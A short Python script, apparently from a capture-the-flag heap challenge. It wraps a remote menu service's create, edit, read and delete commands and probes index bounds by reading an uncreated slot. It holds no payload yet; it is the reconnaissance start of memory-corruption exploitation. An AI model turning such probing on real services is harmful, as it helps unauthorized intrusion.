import socket, time

def recv_all(s, timeout=0.3, count=10):
    out=b''
    s.settimeout(timeout)
    for _ in range(count):
        try:
            r=s.recv(8192)
            if not r: break
            out+=r
        except:
            break
    return out

host='52.76.96.108'; port=9005

def create(idx, size, data):
    s.send(b"1\n"); time.sleep(0.08); recv_all(s,0.12,2)
    s.send(str(idx).encode()+b"\n"); time.sleep(0.08); recv_all(s,0.12,2)
    s.send(str(size).encode()+b"\n"); time.sleep(0.08); recv_all(s,0.12,2)
    s.send(data); time.sleep(0.08); return recv_all(s,0.12,2)

def edit(idx, data):
    s.send(b"2\n"); time.sleep(0.08); recv_all(s,0.12,2)
    s.send(str(idx).encode()+b"\n"); time.sleep(0.08); recv_all(s,0.12,2)
    s.send(data); time.sleep(0.08); return recv_all(s,0.12,2)

def read(idx):
    s.send(b"4\n"); time.sleep(0.08); recv_all(s,0.12,2)
    s.send(str(idx).encode()+b"\n"); time.sleep(0.08); return recv_all(s,0.12,2)

def delete(idx):
    s.send(b"3\n"); time.sleep(0.08); recv_all(s,0.12,2)
    s.send(str(idx).encode()+b"\n"); time.sleep(0.08); return recv_all(s,0.12,2)

s=socket.socket(); s.settimeout(0.4); s.connect((host,port)); time.sleep(0.3)
print(s.recv(8192).decode(errors='replace'))

# Probe: index bounds - create at index 10 and 99
print("create idx 10:", create(10, 0x20, b"B"*0x1f+b"\n"))
print("menu:", recv_all(s))

# Try reading index that doesn't exist
print("read idx 5 (never created):", read(5))
print("menu2:", recv_all(s))
s.close()
